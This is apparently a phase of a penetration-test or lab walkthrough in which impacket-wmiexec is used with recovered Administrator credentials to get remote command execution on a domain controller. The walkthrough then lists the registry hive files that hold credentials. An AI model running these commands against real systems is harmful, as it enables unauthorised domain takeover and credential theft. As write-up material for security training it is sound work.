# 💻 Phase 6 Commands — Administrative Share Access & Privileged Interaction

## Remote Administrative Execution with WMIExec

```bash
impacket-wmiexec SOLARIS/Administrator:'(3vRP<REDACTED>'@192.168.10.7
```

### Purpose

Authenticates to the Domain Controller using recovered Administrator credentials and establishes remote administrative command execution.

---

## Navigate to Registry Hive Storage Location

```cmd
cd Windows\System32\config
```

### Purpose

Navigates to the Windows registry hive directory containing sensitive credential-related system files.

---

## List Protected System Files

```cmd
ls
```

### Purpose

Displays accessible protected operating system files including registry hives and credential storage components.

---

## Verify Administrative Context

```cmd
whoami
```

### Purpose

Confirms the current execution context and validates administrative privileges on the target system.
